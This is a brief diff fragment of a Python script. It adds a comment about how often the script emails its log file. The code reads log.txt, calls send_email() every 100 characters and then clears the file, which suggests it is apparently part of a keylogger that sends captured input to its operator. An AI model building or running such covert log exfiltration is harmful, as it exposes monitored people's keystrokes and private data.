@@ -60,6 +60,7 @@ if Decision == 'y':
 
         f = open('log.txt', 'r+')
         temp = f.read()
+        #CHANGE THE 100 IF YOU WANT TO CHANGE HOW OFTEN IT SENDS YOU AN EMAIL
         if len(temp) % 100 == 0: 
             send_email()
             f.truncate(0)
